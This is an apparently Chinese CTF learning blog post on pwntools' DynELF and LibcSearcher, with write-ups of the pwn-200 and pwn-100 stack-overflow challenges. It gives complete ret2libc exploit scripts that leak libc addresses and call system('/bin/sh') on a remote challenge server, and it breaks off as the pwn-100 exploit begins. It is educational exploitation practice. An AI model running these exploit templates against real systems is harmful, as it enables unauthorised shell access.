<!DOCTYPE html><html lang="en" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>DynELF和LibcSearch | 墨水彩笔</title><meta name="author" content="徐小宇"><meta name="copyright" content="徐小宇"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><meta name="description" content="DyeELF和LibcSearcher库DynELF是pwntools中用来针对没有给libc情况的漏洞利用模块，一般是用puts和write函数来泄露libc地址。 DynELF使用有两个要求： 121.漏洞可以泄露libc地址2.漏洞可以反复利用  模板（以32位write为例）1234567891011121314def leak(address):    payload&#x3D;&amp;#39">
<meta property="og:type" content="article">
<meta property="og:title" content="DynELF和LibcSearch">
<meta property="og:url" content="http://example.com/2021/07/22/DynELF%E5%92%8CLibcSearch/index.html">
<meta property="og:site_name" content="墨水彩笔">
<meta property="og:description" content="DyeELF和LibcSearcher库DynELF是pwntools中用来针对没有给libc情况的漏洞利用模块，一般是用puts和write函数来泄露libc地址。 DynELF使用有两个要求： 121.漏洞可以泄露libc地址2.漏洞可以反复利用  模板（以32位write为例）1234567891011121314def leak(address):    payload&#x3D;&amp;#39">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg">
<meta property="article:published_time" content="2021-07-22T08:58:56.000Z">
<meta property="article:modified_time" content="2021-07-22T08:59:46.524Z">
<meta property="article:author" content="徐小宇">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://example.com/2021/07/22/DynELF%E5%92%8CLibcSearch/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css"><script>var GLOBAL_CONFIG = { 
  root: '/',
  hexoversion: '5.2.0',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true},
  copy: {
    success: 'Copy successfully',
    error: 'Copy error',
    noSupport: 'The browser does not support'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  date_suffix: {
    just: 'Just',
    min: 'minutes ago',
    hour: 'hours ago',
    day: 'days ago',
    month: 'months ago'
  },
  copyright: undefined,
  ClickShowText: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  justifiedGallery: {
    js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
    css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isanchor: false
};

var saveToLocal = {
  set: function setWithExpiry(key, value, ttl) {
    const now = new Date()
    const expiryDay = ttl * 86400000
    const item = {
      value: value,
      expiry: now.getTime() + expiryDay,
    }
    localStorage.setItem(key, JSON.stringify(item))
  },

  get: function getWithExpiry(key) {
    const itemStr = localStorage.getItem(key)

    if (!itemStr) {
      return undefined
    }
    const item = JSON.parse(itemStr)
    const now = new Date()

    if (now.getTime() > item.expiry) {
      localStorage.removeItem(key)
      return undefined
    }
    return item.value
  }
}</script><script id="config_change">var GLOBAL_CONFIG_SITE = { 
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isSidebar: true,
  postUpdate: '2021-07-22 16:59:46'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(function () {
  window.activateDarkMode = function () {
    document.documentElement.setAttribute('data-theme', 'dark')
    if (document.querySelector('meta[name="theme-color"]') !== null) {
      document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
    }
  }
  window.activateLightMode = function () {
    document.documentElement.setAttribute('data-theme', 'light')
    if (document.querySelector('meta[name="theme-color"]') !== null) {
      document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
    }
  }

  const autoChangeMode = 'false'
  const t = saveToLocal.get('theme')
  if (autoChangeMode === '1') {
    const isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches
    const isLightMode = window.matchMedia('(prefers-color-scheme: light)').matches
    const isNotSpecified = window.matchMedia('(prefers-color-scheme: no-preference)').matches
    const hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified

    if (t === undefined) {
      if (isLightMode) activateLightMode()
      else if (isDarkMode) activateDarkMode()
      else if (isNotSpecified || hasNoSupport) {
        const now = new Date()
        const hour = now.getHours()
        const isNight = hour <= 6 || hour >= 18
        isNight ? activateDarkMode() : activateLightMode()
      }
      window.matchMedia('(prefers-color-scheme: dark)').addListener(function (e) {
        if (saveToLocal.get('theme') === undefined) {
          e.matches ? activateDarkMode() : activateLightMode()
        }
      })
    } else if (t === 'light') activateLightMode()
    else activateDarkMode()
  } else if (autoChangeMode === '2') {
    const now = new Date()
    const hour = now.getHours()
    const isNight = hour <= 6 || hour >= 18
    if (t === undefined) isNight ? activateDarkMode() : activateLightMode()
    else if (t === 'light') activateLightMode()
    else activateDarkMode()
  } else {
    if (t === 'dark') activateDarkMode()
    else if (t === 'light') activateLightMode()
  }
})()</script><meta name="generator" content="Hexo 5.2.0"></head><body><div id="mobile-sidebar"><div id="menu_mask"></div><div id="mobile-sidebar-menus"><div class="mobile_author_icon"><img class="avatar-img" src="/null" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="mobile_post_data"><div class="mobile_data_item is-center"><div class="mobile_data_link"><a href="/archives/"><div class="headline">Articles</div><div class="length_num">40</div></a></div></div></div><hr/></div></div><div id="body-wrap"><div id="sidebar"><i class="fas fa-arrow-right on" id="toggle-sidebar"></i><div class="sidebar-toc"><div class="sidebar-toc__title">Catalog</div><div class="sidebar-toc__progress"><span class="progress-notice">You've read</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc__progress-bar">     </div></div><div class="sidebar-toc__content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#DyeELF%E5%92%8CLibcSearcher%E5%BA%93"><span class="toc-number">1.</span> <span class="toc-text">DyeELF和LibcSearcher库</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A8%A1%E6%9D%BF%EF%BC%88%E4%BB%A532%E4%BD%8Dwrite%E4%B8%BA%E4%BE%8B%EF%BC%89"><span class="toc-number">1.1.</span> <span class="toc-text">模板（以32位write为例）</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BB%A5%E7%BB%83%E5%B8%A6%E5%AD%A6%EF%BC%88pwn-200%EF%BC%89"><span class="toc-number">2.</span> <span class="toc-text">以练带学（pwn-200）</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8B%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6%E5%92%8C%E8%BF%90%E8%A1%8C%E6%B5%81%E7%A8%8B"><span class="toc-number">2.1.</span> <span class="toc-text">查看保护机制和运行流程</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8IDA%E5%88%86%E6%9E%90"><span class="toc-number">2.2.</span> <span class="toc-text">使用IDA分析</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B0%8F%E7%9F%A5%E8%AF%86"><span class="toc-number">2.2.0.1.</span> <span class="toc-text">小知识</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9E%84%E6%80%9D"><span class="toc-number">2.3.</span> <span class="toc-text">构思</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#EXP"><span class="toc-number">2.4.</span> <span class="toc-text">EXP</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93%EF%BC%9A"><span class="toc-number">2.5.</span> <span class="toc-text">总结：</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BB%A5%E7%BB%83%E5%B8%A6%E5%AD%A6%EF%BC%88pwn-100%EF%BC%89"><span class="toc-number">3.</span> <span class="toc-text">以练带学（pwn-100）</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8B%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6%E5%92%8C%E8%BF%90%E8%A1%8C%E6%B5%81%E7%A8%8B-1"><span class="toc-number">3.1.</span> <span class="toc-text">查看保护机制和运行流程</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8IDA%E5%88%86%E6%9E%90%E6%BC%8F%E6%B4%9E"><span class="toc-number">3.2.</span> <span class="toc-text">利用IDA分析漏洞</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9E%84%E6%80%9D-1"><span class="toc-number">3.3.</span> <span class="toc-text">构思</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#EXP-1"><span class="toc-number">3.4.</span> <span class="toc-text">EXP</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%95%E4%B8%80%EF%BC%9A"><span class="toc-number">3.4.1.</span> <span class="toc-text">法一：</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%80%9A%E7%94%A8rop"><span class="toc-number">4.</span> <span class="toc-text">通用rop</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%95%E4%BA%8C%EF%BC%9A"><span class="toc-number">4.0.1.</span> <span class="toc-text">法二：</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">5.</span> <span class="toc-text">总结</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5"><span class="toc-number">5.1.</span> <span class="toc-text">参考链接</span></a></li></ol></li></ol></div></div></div><header class="post-bg" id="page-header" style="background-image: url(https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg)"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">墨水彩笔</a></span><span id="menus"><span class="close" id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></span></span></nav><div id="post-info"><div id="post-title"><div class="posttitle">DynELF和LibcSearch</div></div><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2021-07-22T08:58:56.000Z" title="Created 2021-07-22 16:58:56">2021-07-22</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2021-07-22T08:59:46.524Z" title="Updated 2021-07-22 16:59:46">2021-07-22</time></span></div><div class="meta-secondline"> <span class="post-meta-separator">|</span><span class="post-meta-pv-cv"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post View:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout_post" id="content-inner"><article id="post"><div class="post-content" id="article-container"><h1 id="DyeELF和LibcSearcher库"><a href="#DyeELF和LibcSearcher库" class="headerlink" title="DyeELF和LibcSearcher库"></a>DyeELF和LibcSearcher库</h1><p>DynELF是pwntools中用来针对<strong>没有给libc情况</strong>的漏洞利用模块，一般是用<strong>puts和write函数</strong>来泄露libc地址。</p>
<p>DynELF使用有两个要求：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1.漏洞可以泄露libc地址</span><br><span class="line">2.漏洞可以反复利用</span><br></pre></td></tr></table></figure>

<h2 id="模板（以32位write为例）"><a href="#模板（以32位write为例）" class="headerlink" title="模板（以32位write为例）"></a>模板（以32位write为例）</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">def leak(address):</span><br><span class="line">    payload&#x3D;&#39;A&#39;*填充到ret+p32(write_plt)+p32(func_addr)+p32(1)+p32(address)+p32(4)</span><br><span class="line">    #p32(func_addr)后面的内容为传参</span><br><span class="line">    #write(1,address,4)表示将address向外写</span><br><span class="line">    p.send(payload)</span><br><span class="line">    data &#x3D; p.recv(4)</span><br><span class="line">    print(data)</span><br><span class="line">    return data</span><br><span class="line"></span><br><span class="line">dyn&#x3D;DynELF(leak,elf&#x3D;ELF(&#39;.&#x2F;pwn200&#39;))#调用DynELF</span><br><span class="line"></span><br><span class="line">sys_addr &#x3D; dyn.lookup(&#39;system&#39;,libc)</span><br><span class="line">print(&#39;system address:&#39;,hex(sys_addr))</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h1 id="以练带学（pwn-200）"><a href="#以练带学（pwn-200）" class="headerlink" title="以练带学（pwn-200）"></a>以练带学（pwn-200）</h1><h2 id="查看保护机制和运行流程"><a href="#查看保护机制和运行流程" class="headerlink" title="查看保护机制和运行流程"></a>查看保护机制和运行流程</h2><p><img src="https://github.com/xuxiaoyu233/xuxiaoyu233.github.io/blob/picture/DynELF/image-20210720170156713.png?raw=true" alt="image-20210720170156713.png"></p>
<p>1.是一个三十二位程序。(这是重点，因为等等要涉及传参，三十二位是通过栈来传参的)</p>
<p>2.只开了NX<strong>即不能直接执行栈上的数据</strong></p>
<p><img src="https://github.com/xuxiaoyu233/xuxiaoyu233.github.io/blob/picture/DynELF/image-20210720170356163.png?raw=true" alt="image-20210720170356163.png"></p>
<p>程序运行时会进行一次输入，然后结束。</p>
<h2 id="使用IDA分析"><a href="#使用IDA分析" class="headerlink" title="使用IDA分析"></a>使用IDA分析</h2><p><img src="https://github.com/xuxiaoyu233/xuxiaoyu233.github.io/blob/picture/DynELF/image-20210720170430097.png?raw=true" alt="image-20210720170430097.png"></p>
<p>主函数中只有一个输出，还有一个函数跳转。</p>
<h4 id="小知识"><a href="#小知识" class="headerlink" title="小知识"></a>小知识</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">原来write是用来输出的</span><br></pre></td></tr></table></figure>

<p>那么我们继续跳转到下一个函数中去看看吧。</p>
<p><img src="https://github.com/xuxiaoyu233/xuxiaoyu233.github.io/blob/picture/DynELF/image-20210720170731860.png?raw=true" alt="image-20210720170731860.png"></p>
<p>发现在这个函数中存在一个read输入，并且buf的读入为0x100但buf的大小定义为108（也就是十六进制的0x6c），也就是说这里存在栈溢出漏洞。</p>
<h2 id="构思"><a href="#构思" class="headerlink" title="构思"></a>构思</h2><p>我们已经知道的条件：<br>1.存在栈溢出漏洞</p>
<p>2.存在bss可写段</p>
<p>那么我们既然可以控制程序跳转，那么我们应该跳转到哪里呢？   –&gt;想到了利用got表泄露来解题。</p>
<p>我们需要知道的条件：</p>
<p>1.got表的地址和偏移量。</p>
<h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><p>两个方法</p>
<p>一：</p>
<p>1.首先利用我们泄露的地址得出read在本题中所处的位置</p>
<p>2.调用read在Bss中写入/bin/sh</p>
<p>3.在ret地址覆盖system的地址，调用system至bss中的/binsh.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">from pwn import*</span><br><span class="line">p&#x3D;remote(&#39;111.200.241.244&#39;,59481)</span><br><span class="line">elf&#x3D;ELF(&#39;.&#x2F;pwn-200&#39;)			--这个是使用DynELF的必要条件，获取文件的信息</span><br><span class="line">#context.log_level &#x3D; &quot;debug&quot;</span><br><span class="line"></span><br><span class="line">write_plt&#x3D;elf.plt[&#39;write&#39;]</span><br><span class="line">read_plt&#x3D;elf.plt[&#39;read&#39;]</span><br><span class="line">start &#x3D; 0x80484be</span><br><span class="line">vul_addr&#x3D;0x08048484</span><br><span class="line">bss_addr&#x3D;elf.bss()					--这也是很神奇的一种获取bss段的位置，学到了</span><br><span class="line">start_addr&#x3D;0x080483D0</span><br><span class="line">pop_3_addr&#x3D;0x0804856c				--这里为什么要用这个rop‘积木’呢？因为我们是通过write来泄露地址的，write的参数是三									   个，所以需要三个pop来传参</span><br><span class="line"></span><br><span class="line">def leak(address):					--注意这里，这里是使用dynelf的模板，我也尝试改过一下但都报错了，就先记住这个模板吧</span><br><span class="line">    payload&#x3D;&#39;a&#39;*112</span><br><span class="line">    payload+&#x3D;p32(write_plt)</span><br><span class="line">    payload+&#x3D;p32(vul_addr)</span><br><span class="line">    payload+&#x3D;p32(1)</span><br><span class="line">    payload+&#x3D;p32(address)</span><br><span class="line">    payload+&#x3D;p32(4)</span><br><span class="line">    r.send(payload)</span><br><span class="line">    data&#x3D;r.recv(4)</span><br><span class="line">    return data</span><br><span class="line"></span><br><span class="line">r.recvline()</span><br><span class="line">d&#x3D;DynELF(leak,elf&#x3D;ELF(&#39;.&#x2F;pwn-200&#39;))				--这里的话有一个调用，我们上面定义的leaK函数</span><br><span class="line">system_addr&#x3D;d.lookup(&quot;system&quot;,&quot;libc&quot;)			--这也是专用的语句搭配</span><br><span class="line"></span><br><span class="line">	</span><br><span class="line">payload1&#x3D;&#39;a&#39;*112								--这一段是可以删除的，但为什么要保留呢？</span><br><span class="line">	因为之前我们第一次调用栈溢出漏洞的时候，栈的排序被我们打乱，这次的调用是使得栈的内容重置，不会影响下一次的进行。</span><br><span class="line">payload1+&#x3D;p32(start_addr)				</span><br><span class="line">r.sendline(payload1)</span><br><span class="line">r.recv()</span><br><span class="line"></span><br><span class="line">payload2&#x3D;&#39;a&#39;*112							--这一段的内容是调用read然后利用3pop传参</span><br><span class="line">payload2+&#x3D;p32(read_plt)</span><br><span class="line">payload2+&#x3D;p32(pop_3_addr)</span><br><span class="line">payload2+&#x3D;p32(1)</span><br><span class="line">payload2+&#x3D;p32(bss_addr)						--这里使得read的内容写入可执行段内，为后面的调用打下基础</span><br><span class="line">payload2+&#x3D;p32(8)</span><br><span class="line">payload2+&#x3D;p32(system_addr)					--用system的地址覆盖ret，实现调用system</span><br><span class="line">payload2+&#x3D;p32(0)							--为什么要补充一个p32(0)呢？在gf713中我们已经观察到call system的内容不是简单的直接call，而是一系列的操作，这时候就需要一个p32(0)来抵消push的内容，使得第二个传入的才是真正的参数。</span><br><span class="line">payload2+&#x3D;p32(bss_addr)						--这里为什么不能直接写入&#x2F;bin&#x2F;sh呢？因为...我也说不清楚，等以后学知道了再写</span><br><span class="line">#payload2+&#x3D;&#39;&#x2F;bin&#x2F;sh&#39;						--实践证明这种写法也是可以的</span><br><span class="line">r.sendline(payload2)</span><br><span class="line">r.sendline(&#39;&#x2F;bin&#x2F;sh&#39;)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>

<p>法二：</p>
<p>结合我们上面的内容，我们既然知道了泄露的基地址，那为什么不能直接获取system()和/bin/sh的地址直接调用呢？</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">p &#x3D; remote(&#39;111.200.241.244&#39;,50598)</span><br><span class="line">elf &#x3D; ELF(&#39;.&#x2F;pwn-200&#39;)</span><br><span class="line">write_got &#x3D; elf.got[&#39;write&#39;]</span><br><span class="line">write_plt &#x3D; elf.plt[&#39;write&#39;]</span><br><span class="line">read_got &#x3D; elf.got[&#39;read&#39;]</span><br><span class="line">read_plt &#x3D; elf.plt[&#39;read&#39;]</span><br><span class="line"></span><br><span class="line">bss &#x3D; 0x804a000</span><br><span class="line">main_addr &#x3D; 0x8048484</span><br><span class="line">p.recvuntil(&#39;Welcome to XDCTF2015~!\n&#39;)</span><br><span class="line">payload &#x3D; &#39;a&#39;*0x6c + p32(0) + p32(write_plt) + p32(main_addr) + p32(1) + p32(write_got) +p32(8)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">write_got_addr &#x3D; u32(p.recv(4).ljust(4,&#39;\x00&#39;))</span><br><span class="line">print hex(write_got_addr)</span><br><span class="line"></span><br><span class="line">from LibcSearcher import *</span><br><span class="line">libc &#x3D; LibcSearcher(&#39;write&#39;,write_got_addr)</span><br><span class="line">libc_base &#x3D; write_got_addr - libc.dump(&#39;write&#39;)</span><br><span class="line">system_addr &#x3D; libc_base + libc.dump(&#39;system&#39;)</span><br><span class="line">bin_sh_addr &#x3D; libc_base + libc.dump(&#39;str_bin_sh&#39;)</span><br><span class="line"></span><br><span class="line">payload &#x3D; &#39;a&#39;*0x6c + p32(0) + p32(system_addr) + p32(main_addr) + p32(bin_sh_addr)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h2><p>1.泄露地址现在学到了两种方法</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1.Dynelf法，但这个方法无法泄露&#x2F;bin&#x2F;sh的地址（或者说我不知道证明泄露），也许可以利用我们gf715中的查询libc中的&#x2F;bin&#x2F;sh地址，构造			binsh_addr&#x3D;d.lookup(地址,&quot;libc&quot;)					但这里我们不知道版本信息，或者说我还没学到怎么获取</span><br><span class="line">2.调用LibcSearcher库和我们泄露的地址算出偏移后计算。</span><br></pre></td></tr></table></figure>

<p>2.关于传参的问题，我们需要传入对应并且正确的参数才能使得我们构造的函数正常运行。</p>
<p>我们可以调用</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary 文件名 --only (可加&#39;pop|ret&#39;缩小范围)，找到适合的传参rop</span><br></pre></td></tr></table></figure>

<p>3.为什么我们的传参可以直接利用三个pop而不是传到指定的地方呢？因为我们这里是三十二位的程序，传参的方式是通过栈来进行的!</p>
<p>4.利用elf.bss()得到可写段的地址。</p>
<p>5.通过网上的学习，终于再次理解了为什么32位中call_system后需要填充：</p>
<p><img src="https://github.com/xuxiaoyu233/xuxiaoyu233.github.io/blob/picture/DynELF/image-20210721162327644.png?raw=true" alt="image-20210721162327644.png"></p>
<p>我们在call_system后需要再次输入一个返回地址，所以需要填充。并且当我们需要循环利用时，可以将返回地址改为main_addr.</p>
<p>6.在LibcSearcher库中查找**/bin/sh\x00**应该利用str_bin_sh.</p>
<h1 id="以练带学（pwn-100）"><a href="#以练带学（pwn-100）" class="headerlink" title="以练带学（pwn-100）"></a>以练带学（pwn-100）</h1><p>知识点：</p>
<p>1.在x64的程序中，传参方式不同于x86，x64优先采用寄存器rdi, rsi, rdx, rcx, r8, r9，超过部分和x86一样用压栈形式传参</p>
<p>2.关于LibcSearcher库的调用和使用</p>
<h2 id="查看保护机制和运行流程-1"><a href="#查看保护机制和运行流程-1" class="headerlink" title="查看保护机制和运行流程"></a>查看保护机制和运行流程</h2><p><img src="https://github.com/xuxiaoyu233/xuxiaoyu233.github.io/blob/picture/DynELF/image-20210722132239012.png?raw=true" alt="image-20210722132239012.png"></p>
<p>64位的程序，只开了NX保护。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">NX策略是使栈区域的代码无法执行。</span><br><span class="line">NX保护机制其实就是让我们不能直接利用程序中的某一段代码或者自己填写代码来获得 shell，而是通过其他途径绕过保护机制然后得到shell</span><br></pre></td></tr></table></figure>

<p><img src="https://github.com/xuxiaoyu233/xuxiaoyu233.github.io/blob/picture/DynELF/image-20210722132914335.png?raw=true" alt="image-20210722132914335.png"></p>
<p>运行时我们发现，该程序的输入似乎不能被主动停止，需要输入到极限后返回。</p>
<h2 id="利用IDA分析漏洞"><a href="#利用IDA分析漏洞" class="headerlink" title="利用IDA分析漏洞"></a>利用IDA分析漏洞</h2><p><img src="https://github.com/xuxiaoyu233/xuxiaoyu233.github.io/blob/picture/DynELF/image-20210722133022431.png?raw=true" alt="image-20210722133022431.png"></p>
<p>程序一开始进行一系列的初始化操作，并且将v3的值置为0.</p>
<p><img src="https://github.com/xuxiaoyu233/xuxiaoyu233.github.io/blob/picture/DynELF/image-20210722133326601.png?raw=true" alt="image-20210722133326601.png"></p>
<p>进一步我们发现程序存在栈溢出漏洞：</p>
<p>因为v1的大小是64，但这里可以读取200个，所以存在栈溢出。</p>
<p><img src="https://github.com/xuxiaoyu233/xuxiaoyu233.github.io/blob/picture/DynELF/image-20210722134617049.png?raw=true" alt="image-20210722134617049.png"></p>
<p>再次跟进，我们发现两个细节：<br>1.这里的a2对应的是我们前面看到的读取的长度为200.也就是说我们输入的长度必须得大于等于200才能退出循环。</p>
<p>2.我们发现这里的read是被数组化了，使得它的读取是一个个的，也就是说这里结合上面的内容。我们可以得出第三点。</p>
<p>3.输入的长度限制为200，因为读取是按照一个个读入的。</p>
<h2 id="构思-1"><a href="#构思-1" class="headerlink" title="构思"></a>构思</h2><p>已知条件：<br>1.栈溢出</p>
<p>2.存在bss可写段</p>
<p>那么在只知道栈溢出的条件下，我们能不能直接跳转系统的system(/bin/sh)呢？</p>
<p>答案是不可以。首先：本题开了NX，其次二进制文件中没有出现system和/bin/sh。</p>
<p>那么我们就需要转换方向–&gt;能不能泄露地址然后通过栈溢出来利用呢？</p>
<p>所需条件：</p>
<p>1.libc偏移量</p>
<p>2.因为是64位的那么我们需要rop’积木’来传参达到利用的目的</p>
<h2 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP"></a>EXP</h2><h3 id="法一："><a href="#法一：" class="headerlink" title="法一："></a>法一：</h3><p>DyeELF</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td 